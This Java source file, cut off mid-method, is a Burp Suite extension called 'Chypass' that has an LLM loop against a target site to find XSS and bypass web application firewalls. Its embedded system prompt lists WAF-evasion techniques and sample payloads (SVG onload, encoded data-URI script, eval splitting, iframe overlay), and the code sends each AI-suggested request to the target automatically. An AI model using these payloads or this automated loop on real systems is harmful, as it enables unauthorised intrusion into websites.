package burp;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ItemEvent;
import java.awt.event.ItemListener;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicReference;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.TableCellRenderer;
import org.json.JSONObject;
import org.json.JSONArray;

public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private JPanel mainPanel;
    private JSplitPane splitPane;
    private JButton sendToAIButton;
    private JButton stopButton;
    private JButton manualFixButton; // 添加手动修复按钮声明
    private JTextArea requestTextArea;
    private JTextArea responseTextArea;
    private JTextArea aiResponseTextArea;
    private JTextArea logTextArea;
    private JTable historyTable;
    private HistoryTableModel historyTableModel;
    private List<RequestResponseAIPair> history;
    private boolean isRunning = false;
    private String apiKey = "";
    private JTextField apiKeyField;
    private PrintWriter stdout;
    private PrintWriter stderr;
    private IHttpService currentHttpService;
    private JComboBox<String> apiProviderSelector;
    private JTextField modelNameField;
    private JLabel modelNameLabel;
    private JPanel modelConfigPanel;
    private CardLayout modelConfigLayout;
    private List<JSONObject> messageHistory = new ArrayList<>();
    private static final int MAX_HISTORY = 5; // 保持滑动窗口的5轮对话历史
    private Map<Integer, Integer> testPairIdToHistoryIndex = new HashMap<>(); // 新增：跟踪测试对ID到历史索引的映射

    private static final String INITIAL_PROMPT = "你是一个网络安全专家，专注于XSS漏洞的检测和绕过WAF。我会给你完整的请求包和相应包。你需要通过以下步骤分析请求和响应：\n\n" +
            "1. 判断是否存在XSS漏洞：\n" +
            " - 检查输入点是否被正确处理/转义\n" +
            " - 观察响应中是否包含未经过滤的注入代码\n" +
            " - 查看JavaScript是否能成功执行（例如alert/console.log出现）\n" +
            " - 检查HTML结构是否被破坏或修改\n\n" +
            "2. 判断是否被WAF拦截：\n" +
            " - 响应状态码是否为403/406/429等异常状态\n" +
            " - 响应内容中是否包含拦截提示、安全警告或错误页面\n" +
            " - 检查是否返回空白页面或与预期完全不同的内容\n" +
            " - 注入的代码是否被完全删除或明显修改\n\n" +
            "3. WAF绕过技术：\n" +
            " - 大小写混淆：如ScRiPt代替script\n" +
            " - HTML实体编码：使用&lt;、&#x3c;等替代<\n" +
            " - 拆分向量：将危险标签分割，如'jav'+'ascript:'\n" +
            " - 使用别名：使用事件处理或其他标签如img/iframe\n" +
            " - 双重编码：对已编码的内容再次编码\n" +
            " - 使用无害HTML标签的属性事件\n" +
            " - Base64编码/URL编码组合\n\n" +

            "【重要！】当你建议新的HTTP请求时，请严格按照以下规范提供：\n" +
            "1. 必须包含完整的HTTP请求行、所有必需的HTTP头、空行（\\r\\n\\r\\n）和请求体\n" +
            "2. 请求行必须包含HTTP方法、请求路径和HTTP版本\n" +
            "3. 必须包含Host头部\n" +
            "4. 对于POST/PUT请求，必须包含正确的Content-Type和Content-Length\n" +
            "5. 维持原始请求中的所有其他必要头部\n" +
            "6. 在提供HTTP请求之前，使用```http标记，之后使用```结束\n" +
            "7. 不要添加任何额外的格式或说明文字到HTTP请求中\n" +
            "8. 确保请求体（如有）内容完整且格式正确\n\n" +

            "示例格式：\n" +
            "```http\n" +
            "POST /example.php HTTP/1.1\n" +
            "Host: example.com\n" +
            "User-Agent: Mozilla/5.0\n" +
            "Content-Type: application/x-www-form-urlencoded\n" +
            "Content-Length: 27\n" +
            "Connection: close\n" +
            "\n" +
            "param1=value1&param2=value2\n" +
            "```\n\n" +

            "一、WAF存在性检测阶段\n\n" +
            "基础特征分析：\n" +
            "检查HTTP响应头中是否包含Cloudflare/Akamai/Imperva等WAF标识\n" +
            "分析响应状态码异常（如403/406/501非预期状态）\n" +
            "计算请求响应时间差（>2秒可能触发行为分析）\n\n" +
            "二、基础注入验证\n\n" +
            "无害探针注入：\n" +
            "<svg%0aonload=confirm(1)>\n" +
            "\"><img src=x onerror=alert(1)>\n\n" +
            "响应特征比对：\n" +
            "原始payload留存率分析（完整度≥80%？）\n" +
            "特殊字符存活统计（<>\"'/等字符过滤情况）\n" +
            "上下文语义完整性检测（是否破坏原有HTML结构）\n\n" +
            "三、WAF拦截判定矩阵\n" +
            "请建立三维判定模型：\n" +
            "| 检测维度 | 阳性特征 | 权重 |\n" +
            "|-----------------|-----------------------------------|------|\n" +
            "| 响应内容 | 包含blocked/forbidden/detected等关键词 | 0.7 |\n" +
            "| HTTP状态码 | 403/406/419/503 | 0.9 |\n" +
            "| 响应延迟 | ≥1500ms | 0.5 |\n" +
            "| 字符转换 | >50%特殊字符被编码/删除 | 0.8 |\n\n" +
            "综合评分≥1.5分判定为WAF拦截\n\n" +
            "四、绕过策略决策树\n" +
            "请按优先级尝试以下向量：\n" +
            "1. 字符级绕过：\n" +
            " - Unicode编码：\\u003cscript\\u003e\n" +
            " - HTML实体变异：&lt;script&gt; → &lt;script&GT;\n" +
            " - 控制字符注入：%0d%0a%09等\n\n" +
            "2. 语法级绕过：\n" +
            " - 标签属性嵌套：<a href=\"javascript:alert`1`\">\n" +
            " - 事件处理变形：onpointerenter=alert(1)\n" +
            " - SVG矢量封装：<svg/onload=alert(1)>\n\n" +
            "3. 协议级混淆：\n" +
            " - data协议注入：<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">\n" +
            " - JS伪协议分割：java&#x09;script:alert(1)\n\n" +
            "4. 逻辑级混淆：\n" +
            " - 字符串拆解：eval('al'+'er'+'t(1)')\n" +
            " - 环境检测触发：window.innerWidth>0&&alert(1)\n\n" +
            "5. 高级iframe技术：\n" +
            " - 叠加iframe：<iframe src=\"目标网站\" style=\"opacity:0.1;position:absolute;top:0;left:0;width:100%;height:100%;z-index:999999\"></iframe>\n" +
            " - 隐形iframe：<iframe src=\"javascript:alert(document.domain)\" style=\"display:none\"></iframe>\n\n" +
            "五、XSS成功验证标准\n" +
            "五、XSS成功验证标准\n" +
            "需满足以下任二项即为成功：\n\n" +
            "DOM变更检测：\n" +
            "document.documentElement.innerHTML包含有效payload\n" +
            "新建script节点可见于DOM树\n" +
            "错误诱导：\n" +
            "生成非常规JS错误（如未定义函数故意调用）\n\n" +
            "注意！！！！！！不需要过多回复，只需要给我结论，是否xss成功，是否被waf拦截，然后按照上述格式要求给出一个完整的修改后的HTTP请求，请确保请求格式完全正确，我会使用你提供的请求进行测试，并将结果返回给你继续分析，如果没有收到相应包，那就直接判断被拦截，xss失败";

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        this.history = new ArrayList<>();
        this.historyTableModel = new HistoryTableModel();

// 设置日志输出
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
        this.stderr = new PrintWriter(callbacks.getStderr(), true);

        callbacks.setExtensionName("Chypass");

        logToConsole("Chypass extension loaded");

        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                mainPanel = new JPanel(new BorderLayout());

// 创建API设置面板 - 使用更好的布局
                JPanel apiPanel = new JPanel(new GridBagLayout());
                GridBagConstraints gbc = new GridBagConstraints();
                gbc.anchor = GridBagConstraints.WEST;
                gbc.insets = new Insets(5, 5, 5, 5);

// API提供商选择器
                gbc.gridx = 0;
                gbc.gridy = 0;
                gbc.gridwidth = 1;
                apiPanel.add(new JLabel("API Provider:"), gbc);

                gbc.gridx = 1;
                gbc.gridwidth = 2;
                apiProviderSelector = new JComboBox<>(new String[]{"DeepSeek", "SiliconFlow", "Kimi", "QwenAI"});
                apiPanel.add(apiProviderSelector, gbc);

// API密钥
                gbc.gridx = 0;
                gbc.gridy = 1;
                gbc.gridwidth = 1;
                apiPanel.add(new JLabel("API Key:"), gbc);

                gbc.gridx = 1;
                gbc.gridwidth = 2;
                gbc.fill = GridBagConstraints.HORIZONTAL;
                apiKeyField = new JTextField(40);
                apiPanel.add(apiKeyField, gbc);

// 创建模型配置面板 - 使用CardLayout来根据API提供商切换
                modelConfigPanel = new JPanel();
                modelConfigLayout = new CardLayout();
                modelConfigPanel.setLayout(modelConfigLayout);

// DeepSeek模型配置（空白，因为DeepSeek不需要指定模型）
                JPanel deepseekPanel = new JPanel(new BorderLayout());
                modelConfigPanel.add(deepseekPanel, "DeepSeek");

// SiliconFlow模型配置
                JPanel siliconflowPanel = new JPanel(new GridBagLayout());
                GridBagConstraints sfGbc = new GridBagConstraints();
                sfGbc.anchor = GridBagConstraints.WEST;
                sfGbc.insets = new Insets(5, 5, 5, 5);
                sfGbc.gridx = 0;
                sfGbc.gridy = 0;
                siliconflowPanel.add(new JLabel("Model Name:"), sfGbc);

                sfGbc.gridx = 1;
                sfGbc.fill = GridBagConstraints.HORIZONTAL;
                JTextField siliconFlowModelField = new JTextField("ft:", 40);
                siliconflowPanel.add(siliconFlowModelField, sfGbc);
                modelConfigPanel.add(siliconflowPanel, "SiliconFlow");

// Kimi模型配置
                JPanel kimiPanel = new JPanel(new GridBagLayout());
                GridBagConstraints kimiGbc = new GridBagConstraints();
                kimiGbc.anchor = GridBagConstraints.WEST;
                kimiGbc.insets = new Insets(5, 5, 5, 5);
                kimiGbc.gridx = 0;
                kimiGbc.gridy = 0;
                kimiPanel.add(new JLabel("Model Name:"), kimiGbc);

                kimiGbc.gridx = 1;
                kimiGbc.fill = GridBagConstraints.HORIZONTAL;
                JTextField kimiModelField = new JTextField("moonshot-v1-8k", 40);
                kimiPanel.add(kimiModelField, kimiGbc);
                modelConfigPanel.add(kimiPanel, "Kimi");

// QwenAI模型配置
                JPanel qwenPanel = new JPanel(new GridBagLayout());
                GridBagConstraints qwenGbc = new GridBagConstraints();
                qwenGbc.anchor = GridBagConstraints.WEST;
                qwenGbc.insets = new Insets(5, 5, 5, 5);
                qwenGbc.gridx = 0;
                qwenGbc.gridy = 0;
                qwenPanel.add(new JLabel("Model Name:"), qwenGbc);

                qwenGbc.gridx = 1;
                qwenGbc.fill = GridBagConstraints.HORIZONTAL;
                JTextField qwenModelField = new JTextField("qwen-plus", 40);
                qwenPanel.add(qwenModelField, qwenGbc);
                modelConfigPanel.add(qwenPanel, "QwenAI");

// 添加模型配置面板
                gbc.gridx = 0;
                gbc.gridy = 2;
                gbc.gridwidth = 3;
                apiPanel.add(modelConfigPanel, gbc);

// 显示初始模型配置面板
                modelConfigLayout.show(modelConfigPanel, (String)apiProviderSelector.getSelectedItem());

// 设置API提供商切换监听器
                apiProviderSelector.addItemListener(new ItemListener() {
                    @Override
                    public void itemStateChanged(ItemEvent e) {
                        if (e.getStateChange() == ItemEvent.SELECTED) {
                            String provider = (String)apiProviderSelector.getSelectedItem();
                            modelConfigLayout.show(modelConfigPanel, provider);
                        }
                    }
                });

                mainPanel.add(apiPanel, BorderLayout.NORTH);

// 创建按钮面板
                JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
                sendToAIButton = new JButton("Send to AI");
                stopButton = new JButton("Stop");
                JButton clearHistoryButton = new JButton("Clear AI History");
// 新增：手动修复请求按钮
                manualFixButton = new JButton("Manual Fix & Continue");
                stopButton.setEnabled(false);
                manualFixButton.setEnabled(false); // 默认禁用，只有在提取请求失败时启用
                buttonPanel.add(sendToAIButton);
                buttonPanel.add(stopButton);
                buttonPanel.add(manualFixButton);
                buttonPanel.add(clearHistoryButton);

// Create history table
                historyTable = new JTable(historyTableModel);
                historyTable.setAutoResizeMode(JTable.AUTO_RESIZE_ALL_COLUMNS);
                historyTable.getColumnModel().getColumn(0).setPreferredWidth(30);
                historyTable.getColumnModel().getColumn(1).setPreferredWidth(200);
                historyTable.getColumnModel().getColumn(2).setPreferredWidth(60);
                historyTable.getColumnModel().getColumn(3).setPreferredWidth(60);
                historyTable.getColumnModel().getColumn(4).setPreferredWidth(100);

// 设置历史表格的单元格渲染器，使文本垂直居中并进行截断
                TableCellRenderer centerRenderer = new DefaultTableCellRenderer() {
                    @Override
                    public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column) {
                        Component c = super.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column);
                        if (c instanceof JLabel) {
                            JLabel label = (JLabel) c;
                            label.setHorizontalAlignment(JLabel.CENTER);
                            if (value != null && value.toString().length() > 50) {
                                label.setToolTipText(value.toString());
                            }
                        }
                        return c;
                    }
                };

// 应用渲染器到所有列
                for (int i = 0; i < historyTable.getColumnCount(); i++) {
                    historyTable.getColumnModel().getColumn(i).setCellRenderer(centerRenderer);
                }

                JScrollPane historyScrollPane = new JScrollPane(historyTable);

// Create request/response/ai response panel
                requestTextArea = new JTextArea(10, 50);
                responseTextArea = new JTextArea(10, 50);
                aiResponseTextArea = new JTextArea(10, 50);
                logTextArea = new JTextArea(5, 50);
                logTextArea.setEditable(false);

                JScrollPane requestScrollPane = new JScrollPane(requestTextArea);
                JScrollPane responseScrollPane = new JScrollPane(responseTextArea);
                JScrollPane aiResponseScrollPane = new JScrollPane(aiResponseTextArea);
                JScrollPane logScrollPane = new JScrollPane(logTextArea);

// Add labels to panels
                JPanel requestPanel = new JPanel(new BorderLayout());
                requestPanel.add(new JLabel("Request:"), BorderLayout.NORTH);
                requestPanel.add(requestScrollPane, BorderLayout.CENTER);

                JPanel responsePanel = new JPanel(new BorderLayout());
                responsePanel.add(new JLabel("Response:"), BorderLayout.NORTH);
                responsePanel.add(responseScrollPane, BorderLayout.CENTER);

                JPanel aiResponsePanel = new JPanel(new BorderLayout());
                aiResponsePanel.add(new JLabel("AI Analysis:"), BorderLayout.NORTH);
                aiResponsePanel.add(aiResponseScrollPane, BorderLayout.CENTER);

// Add the log panel
                JPanel logPanel = new JPanel(new BorderLayout());
                logPanel.add(new JLabel("Logs:"), BorderLayout.NORTH);
                logPanel.add(logScrollPane, BorderLayout.CENTER);

// Create tab pane for request, response, AI analysis
                JTabbedPane tabbedPane = new JTabbedPane();
                tabbedPane.addTab("Request", requestPanel);
                tabbedPane.addTab("Response", responsePanel);
                tabbedPane.addTab("AI Analysis", aiResponsePanel);

// Add the log panel to the bottom
                JSplitPane mainContentPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
                mainContentPane.setTopComponent(tabbedPane);
                mainContentPane.setBottomComponent(logPanel);
                mainContentPane.setResizeWeight(0.8);

// Main split panel
                JSplitPane mainSplitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
                mainSplitPane.setLeftComponent(historyScrollPane);
                mainSplitPane.setRightComponent(mainContentPane);
                mainSplitPane.setResizeWeight(0.3);

                JPanel centerPanel = new JPanel(new BorderLayout());
                centerPanel.add(buttonPanel, BorderLayout.NORTH);
                centerPanel.add(mainSplitPane, BorderLayout.CENTER);

                mainPanel.add(centerPanel, BorderLayout.CENTER);

// 存储模型字段引用
                modelNameField = siliconFlowModelField;

// 创建一个对象用于存储当前迭代状态
                final AtomicReference<AISessionState> sessionState = new AtomicReference<>(new AISessionState());

// Register event listeners
                sendToAIButton.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
// 根据当前选择的API提供商获取正确的模型名称
                        String provider = (String)apiProviderSelector.getSelectedItem();
                        if ("SiliconFlow".equals(provider)) {
                            modelNameField = siliconFlowModelField;
                        } else if ("Kimi".equals(provider)) {
                            modelNameField = kimiModelField;
                        } else if ("QwenAI".equals(provider)) {
                            modelNameField = qwenModelField;
                        }
                        startAISession(sessionState.get());
                    }
                });

                stopButton.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        stopAISession();
                        manualFixButton.setEnabled(false);
                    }
                });

// 新增：手动修复请求按钮的事件监听器
                manualFixButton.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        AISessionState state = sessionState.get();
                        if (state != null && isRunning) {
                            String fixedRequest = requestTextArea.getText();
                            if (fixedRequest != null && !fixedRequest.isEmpty()) {
                                state.setManualFixedRequest(fixedRequest);
                                state.setWaitingForManualFix(false);
                                manualFixButton.setEnabled(false);
                                logToUI("Manual fix applied, continuing AI session...");
                                continuteAISessionWithFixedRequest(state);
                            }
                        }
                    }
                });

                clearHistoryButton.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        messageHistory.clear();
                        history.clear();
                        testPairIdToHistoryIndex.clear(); // 清除映射
                        historyTableModel.fireTableDataChanged();
                        logToUI("AI conversation history and test history cleared");
                    }
                });

                historyTable.getSelectionModel().addListSelectionListener(e -> {
                    if (!e.getValueIsAdjusting()) {
                        int selectedRow = historyTable.getSelectedRow();
                        if (selectedRow >= 0 && selectedRow < history.size()) {
                            RequestResponseAIPair pair = history.get(selectedRow);
                            requestTextArea.setText(new String(pair.getRequest(), StandardCharsets.UTF_8));
                            responseTextArea.setText(new String(pair.getResponse(), StandardCharsets.UTF_8));
                            aiResponseTextArea.setText(pair.getAiResponse());

// 自动切换到AI Analysis选项卡来显示AI分析
                            tabbedPane.setSelectedIndex(2);
                        }
                    }
                });

                callbacks.customizeUiComponent(mainPanel);
                callbacks.addSuiteTab(BurpExtender.this);
                callbacks.registerContextMenuFactory(BurpExtender.this);

                logToUI("UI initialized. Ready to use.");
            }
        });
    }

    // 新增：AI会话状态类，用于在不同迭代之间保持状态
    private class AISessionState {
        private int iterationCount = 0;
        private String lastAIResponse = null;
        private boolean waitingForManualFix = false;
        private String manualFixedRequest = null;
        private int lastTestPairId = -1; // 跟踪最后添加的测试对的ID

        public int getIterationCount() {
            return iterationCount;
        }

        public void incrementIterationCount() {
            this.iterationCount++;
        }

        public String getLastAIResponse() {
            return lastAIResponse;
        }

        public void setLastAIResponse(String lastAIResponse) {
            this.lastAIResponse = lastAIResponse;
        }

        public boolean isWaitingForManualFix() {
            return waitingForManualFix;
        }

        public void setWaitingForManualFix(boolean waitingForManualFix) {
            this.waitingForManualFix = waitingForManualFix;
        }

        public String getManualFixedRequest() {
            return manualFixedRequest;
        }

        public void setManualFixedRequest(String manualFixedRequest) {
            this.manualFixedRequest = manualFixedRequest;
        }

        public int getLastTestPairId() {
            return lastTestPairId;
        }

        public void setLastTestPairId(int lastTestPairId) {
            this.lastTestPairId = lastTestPairId;
        }

        public void reset() {
            iterationCount = 0;
            lastAIResponse = null;
            waitingForManualFix = false;
            manualFixedRequest = null;
            lastTestPairId = -1;
        }
    }

    @Override
    public String getTabCaption() {
        return "Chypass";
    }

    @Override
    public Component getUiComponent() {
        return mainPanel;
    }

    @Override
    public List<JMenuItem> createMenuItems(IContextMenuInvocation invocation) {
        List<JMenuItem> menuItems = new ArrayList<>();

        JMenuItem sendToPluginMenuItem = new JMenuItem("Send to Chypass");
        sendToPluginMenuItem.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                IHttpRequestResponse[] messages = invocation.getSelectedMessages();
                if (messages != null && messages.length > 0) {
                    IHttpRequestResponse message = messages[0];
                    byte[] request = message.getRequest();
                    byte[] response = message.getResponse();

// 保存当前HTTP服务信息，以便后续使用
                    currentHttpService = message.getHttpService();

                    logToConsole("Received HTTP service details: " +
                            currentHttpService.getHost() + ":" +
                            currentHttpService.getPort() + " (" +
                            currentHttpService.getProtocol() + ")");

                    requestTextArea.setText(new String(request, StandardCharsets.UTF_8));
                    if (response != null) {
                        responseTextArea.setText(new String(response, StandardCharsets.UTF_8));
                    } else {
                        responseTextArea.setText("");
                    }

                    logToUI("Request loaded from context menu");
                }
            }
        });

        menuItems.add(sendToPluginMenuItem);
        return menuItems;
    }

    // 修改：使用AISessionState作为参数
    private void startAISession(AISessionState sessionState) {
        if (isRunning) {
            return;
        }

        if (currentHttpService == null) {
            JOptionPane.showMessageDialog(mainPanel,
                    "No HTTP service details available. Please right-click a request in Burp and select 'Send to Chypass'.",
                    "Missing HTTP Service Details",
                    JOptionPane.ERROR_MESSAGE);
            logToUI("Error: Missing HTTP service details");
            return;
        }

        apiKey = apiKeyField.getText().trim();
        if (apiKey.isEmpty()) {
            JOptionPane.showMessageDialog(mainPanel, "Please enter an API key.", "API Key Required", JOptionPane.ERROR_MESSAGE);
            logToUI("Error: API key is required");
            return;
        }

        String requestContent = requestTextArea.getText();
        if (requestContent.isEmpty()) {
            JOptionPane.showMessageDialog(mainPanel, "Please load a request first.", "No Request", JOptionPane.ERROR_MESSAGE);
            logToUI("Error: No request loaded");
            return;
        }

        isRunning = true;
        sendToAIButton.setEnabled(false);
        stopButton.setEnabled(true);

// 重置状态
        sessionState.reset();

        String apiProvider = (String) apiProviderSelector.getSelectedItem();
        logToUI("Starting AI session with " + apiProvider + " API");

// Initialize message history if empty (first run)
        if (messageHistory.isEmpty()) {
// Add system message
            JSONObject systemMessage = new JSONObject();
            systemMessage.put("role", "system");
            systemMessage.put("content", INITIAL_PROMPT);
            messageHistory.add(systemMessage);
        }

// Start in a background thread
        new Thread(() -> {
            String initialConversation = "Initial HTTP Request:\n\n" + requestContent;
            String responseContent = responseTextArea.getText();
            if (!responseContent.isEmpty()) {
                initialConversation += "\n\nInitial HTTP Response:\n\n" + responseContent;
            }

// Add user's initial message
            JSONObject userMessage = new JSONObject();
            userMessage.put("role", "user");
            userMessage.put("content", initialConversation);

// 使用滑动窗口管理对话历史
// 保留系统消息（索引0），然后添加最新消息
            if (messageHistory.size() > 1) { // 已经有历史对话
                List<JSONObject> tempHistory = new ArrayList<>();

// 总是保留系统消息
                tempHistory.add(messageHistory.get(0));

// 确定需要保留的轮数
                int totalPairs = (messageHistory.size() - 1) / 2; // 除去系统消息后的对话对数
                int startPair = Math.max(0, totalPairs - MAX_HISTORY + 1); // 确保至少保留最近的MAX_HISTORY对

// 添加需要保留的历史消息
                for (int i = startPair; i < totalPairs; i++) {
                    int userIndex = i * 2 + 1; // 用户消息的索引
                    int assistantIndex = userIndex + 1; // 助手消息的索引

                    if (userIndex < messageHistory.size()) {
                        tempHistory.add(messageHistory.get(userIndex));
                    }

                    if (assistantIndex < messageHistory.size()) {
                        tempHistory.add(messageHistory.get(assistantIndex));
                    }
                }

// 添加最新的用户消息
                tempHistory.add(userMessage);

// 更新消息历史
                messageHistory = tempHistory;
            } else {
// 第一次对话，直接添加用户消息
                messageHistory.add(userMessage);
            }

            processAIIteration(sessionState);

        }).start();
    }

    // 新增：处理AI迭代的核心方法
    private void processAIIteration(AISessionState sessionState) {
        if (!isRunning) {
            return;
        }

        try {
            sessionState.incrementIterationCount();
            String apiProvider = (String) apiProviderSelector.getSelectedItem();
            logToUI("Sending conversation to " + apiProvider + " API... (Iteration " + sessionState.getIterationCount() + ")");
            logToConsole("Sending with message history size: " + messageHistory.size());

// 保存当前请求和响应
            final String currentRequest = requestTextArea.getText();
            final String currentResponse = responseTextArea.getText();
            final byte[] currentRequestBytes = currentRequest.getBytes(StandardCharsets.UTF_8);
            final byte[] currentResponseBytes = currentResponse.getBytes(StandardCharsets.UTF_8);

// Send to AI based on selected provider
            String aiResponse;
            if ("DeepSeek".equals(apiProvider)) {
                aiResponse = sendToDeepSeekAI();
            } else if ("SiliconFlow".equals(apiProvider)) {
                aiResponse = sendToSiliconFlowAI();
            } else if ("QwenAI".equals(apiProvider)) {
                aiResponse = sendToQwenAI();
            } else { // Kimi
                aiResponse = sendToKimiAIWithRetry(0);
            }

            logToUI("Received response from " + apiProvider + " AI");
            sessionState.setLastAIResponse(aiResponse);

// Store AI response in history
            JSONObject assistantMessage = new JSONObject();
            assistantMessage.put("role", "assistant");
            assistantMessage.put("content", aiResponse);
            messageHistory.add(assistantMessage);

// 添加当前的请求、响应和AI回复到历史记录
            final String finalAiResponse = aiResponse;
            RequestResponseAIPair currentPair = new RequestResponseAIPair(
                    currentRequestBytes,
                    currentResponseBytes,
                    finalAiResponse,
                    history.size() + 1
            );
            history.add(currentPair);

// Update AI response area and history table
            SwingUtilities.invokeLater(() -> {
                aiResponseTextArea.setText(finalAiResponse);
                historyTableModel.fireTableDataChanged();
                if (!history.isEmpty()) {
                    historyTable.setRowSelectionInterval(history.size() - 1, history.size() - 1);
                }
            });

// Extract the request from AI response
            String extractedRequest = extractRequestFromAIResponse(aiResponse);

            if (extractedRequest != null && !extractedRequest.isEmpty()) {
                logToUI("Extracted request from AI response");
                logToConsole("Extracted request: " + extractedRequest);

// 验证和修复请求
                extractedRequest = validateAndFixRequest(extractedRequest);

                if (extractedRequest == null) {
// 请求验证失败
                    handleRequestExtractionFailure(sessionState, "Failed to validate the extracted request");
                    return;
                }

// 继续处理有效的请求
                processValidRequest(extractedRequest, sessionState);

            } else {
// 请求提取失败
                handleRequestExtractionFailure(sessionState, "Could not extract a valid HTTP request from AI response");
                return;
            }

// 为不同的API提供商设置不同的延迟时间
            String currentProvider = (String) apiProviderSelector.getSelectedItem();
            if ("Kimi".equals(currentProvider)) {
                logToUI("Adding extra delay for Kimi API to avoid rate limiting...");
                Thread.sleep(3000); // Kimi API使用3秒延迟
            } else if ("DeepSeek".equals(currentProvider)) {
                Thread.sleep(1500); // DeepSeek使用1.5秒延迟
            } else if ("QwenAI".equals(currentProvider)) {
                Thread.sleep(2000); // QwenAI使用2秒延迟
            } else {
                Thread.sleep(1000); // 其他API使用1秒延迟
            }

// 继续下一次迭代
            processAIIteration(sessionState);

        } catch (Exception e) {
            String errorMessage = "Error: " + e.getMessage();
            logToUI(errorMessage);
            logToConsole("Exception: " + e.toString());
            e.printStackTrace(stderr);
            JOptionPane.showMessageDialog(mainPanel, errorMessage, "Error", JOptionPane.ERROR_MESSAGE);

// 恢复UI状态
            SwingUtilities.invokeLater(() -> {
                isRunning = false;
                sendToAIButton.setEnabled(true);
                stopButton.setEnabled(false);
                SwingUtilities.invokeLater(() -> manualFixButton.setEnabled(false));
                logToUI("AI session stopped due to error");
            });
        }
    }

    // 新增：处理请求提取失败的方法
    private void handleRequestExtractionFailure(AISessionState sessionState, String errorMessage) {
        logToUI("Error: " + errorMessage);
        logToConsole(errorMessage);

// 在UI线程中更新UI状态
        SwingUtilities.invokeLater(() -> {
// 设置标志，表示正在等待手动修复
            sessionState.setWaitingForManualFix(true);
            manualFixButton.setEnabled(true);

// 提示用户修复请求
            String message = errorMessage + "\n\nYou can either:\n" +
                    "1. Manually fix the request in the Request tab and click 'Manual Fix & Continue'\n" +
                    "2. Or click 'Stop' to end the session";
            JOptionPane.showMessageDialog(
                    mainPanel,
                    message,
                    "Request Extraction Error",
                    JOptionPane.WARNING_MESSAGE
            );

// 显示AI分析和当前请求，以便用户可以编辑
            aiResponseTextArea.setText(sessionState.getLastAIResponse());
            requestTextArea.setText(""); // 清空请求框，等待用户输入新请求
        });
    }

    // 新增：使用手动修复的请求继续AI会话
    private void continuteAISessionWithFixedRequest(AISessionState sessionState) {
        if (!isRunning || !sessionState.isWaitingForManualFix()) {
            return;
        }

// 使用手动修复的请求
        String fixedRequest = sessionState.getManualFixedRequest();
        if (fixedRequest == null || fixedRequest.isEmpty()) {
            logToUI("Error: No fixed request provided");
            return;
        }

// 重置状态
        sessionState.setWaitingForManualFix(false);
        sessionState.setManualFixedRequest(null);

        try {
// 处理修复后的请求
            processValidRequest(fixedRequest, sessionState);

// 为下一轮迭代添加延迟
            Thread.sleep(1000);

// 继续下一次迭代
            processAIIteration(sessionState);

        } catch (Exception e) {
            String errorMessage = "Error processing fixed request: " + e.getMessage();
            logToUI(errorMessage);
            logToConsole(errorMessage);
            e.printStackTrace(stderr);

// 恢复UI状态
            SwingUtilities.invokeLater(() -> {
                isRunning = false;
                sendToAIButton.setEnabled(true);
                stopButton.setEnabled(false);
                manualFixButton.setEnabled(false);
                logToUI("AI session stopped due to error");
            });
        }
    }

    // 新增：处理有效请求的方法
    private void processValidRequest(String validRequest, AISessionState sessionState) throws Exception {
// 使用HTTP请求的字节形式
        byte[] requestBytes = validRequest.getBytes(StandardCharsets.UTF_8);

        logToUI("Sending validated request to target: " +
                currentHttpService.getHost() + ":" +
                currentHttpService.getPort());

// 使用Burp的IHttpService发送请求
        IHttpRequestResponse httpRequestResponse = null;
        try {
// 使用Burp的IRequestInfo分析请求以确保格式正确
            IRequestInfo requestInfo = helpers.analyzeRequest(requestBytes);
            if (requestInfo.getMethod() == null || requestInfo.getUrl() == null) {
                throw new Exception("Invalid request format: missing method or URL");
            }

            httpRequestResponse = callbacks.makeHttpRequest(
                    currentHttpService,
                    requestBytes);
        } catch (Exception e) {
            logToUI("Error sending request: " + e.getMessage());

// 尝试使用紧急修复
            String fixedRequest = tryToFixHttpRequestFormat(validRequest);
            if (fixedRequest != null) {
                logToUI("Trying with emergency fixed request format");
                requestBytes = fixedRequest.getBytes(StandardCharsets.UTF_8);

                try {
                    httpRequestResponse = callbacks.makeHttpRequest(
                            currentHttpService,
                            requestBytes);

// 更新提取的请求为修复后的请求
                    validRequest = fixedRequest;
                } catch (Exception ex) {
                    logToUI("Error sending fixed request: " + ex.getMessage());
                    throw ex; // 重新抛出异常以终止当前迭代
                }
            } else {
                throw e; // 如果无法修复，重新抛出原始异常
            }
        }

// 检查响应
        if (httpRequestResponse == null || httpRequestResponse.getResponse() == null) {
            throw new Exception("No response received from target");
        }

// 从IHttpRequestResponse获取响应数据
        byte[] responseBytes = httpRequestResponse.getResponse();

        String responseText = new String(responseBytes, StandardCharsets.UTF_8);
        IResponseInfo responseInfo = helpers.analyzeResponse(responseBytes);
        logToUI("Received response from target (Status: " + responseInfo.getStatusCode() + ")");

// 更新UI上的请求/响应文本区域
        final String finalRequest = validRequest;
        final String finalResponseText = responseText;
        SwingUtilities.invokeLater(() -> {
            requestTextArea.setText(finalRequest);
